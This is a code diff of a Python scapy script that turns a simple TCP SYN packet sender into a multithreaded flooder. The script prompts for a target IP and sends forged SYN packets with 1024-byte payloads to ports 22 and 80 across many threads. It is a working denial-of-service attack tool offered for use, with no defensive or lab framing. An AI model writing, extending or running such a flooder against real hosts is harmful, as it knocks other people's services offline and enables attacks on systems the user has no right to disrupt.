@@ -1,34 +1,55 @@
 from scapy.all import *
+import threading
 
-def send_packets(target_ip, target_port, num_packets):
-    # forge IP packet with target ip as the destination IP address
+# Global variables
+send_lock = threading.Lock()
+stop_event = threading.Event()
+
+def generate_packet(target_ip):
     ip = IP(dst=target_ip)
-
-    # forge a TCP SYN packet with a random source port
-    # and the target port as the destination port
-    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
-
+    tcp = TCP(sport=RandShort(), dport=[22, 80], seq=12345, ack=1000, window=1000, flags=["S"])
     raw = Raw(b"X" * 1024)
+    return ip / tcp / raw
 
-    # stack up the layers
-    p = ip / tcp / raw
+def send_packets_thread(target_ip, num_packets):
+    packets = [generate_packet(target_ip) for _ in range(num_packets)]
 
     try:
-        # send the specified number of packets
-        send(p, count=num_packets, verbose=0)
-        print(f"Sent {num_packets} packets successfully.")
+        with send_lock:
+            send(packets, verbose=0)
+        if not stop_event.is_set():
+            print(f"Thread sent {num_packets} packets successfully.")
     except KeyboardInterrupt:
-        print("Ctrl+C detected. Stopping the program gracefully.")
+        print("Thread KeyboardInterrupt. Stopping the thread gracefully.")
+
+def send_packets(target_ip, num_packets, num_threads):
+    # Create threads
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_packets_thread, args=(target_ip, num_packets))
+        threads.append(thread)
+
+    try:
+        # Start threads
+        for thread in threads:
+            thread.start()
+
+        # Wait for all threads to finish
+        for thread in threads:
+            thread.join()
+
+        print(f"Sent {num_threads * num_packets} packets successfully.")
+    except KeyboardInterrupt:
+        print("Main KeyboardInterrupt. Stopping threads gracefully.")
+        # Set the stop event to signal threads to stop
+        stop_event.set()
+        # Wait for threads to finish
+        for thread in threads:
+            thread.join()
 
 if __name__ == "__main__":
-    # target IP address
     target_ip = input("Enter the target IP: ")
+    num_packets = int(input("Enter the number of packets to send per thread: "))
+    num_threads = int(input("Enter the number of threads: "))
 
-    # target port
-    target_port = int(input("Enter the target Port: "))
-
-    # number of packets to send
-    num_packets = int(input("Enter the number of packets to send: "))
-
-    # call the function to send packets
-    send_packets(target_ip, target_port, num_packets)
+    send_packets(target_ip, num_packets, num_threads)
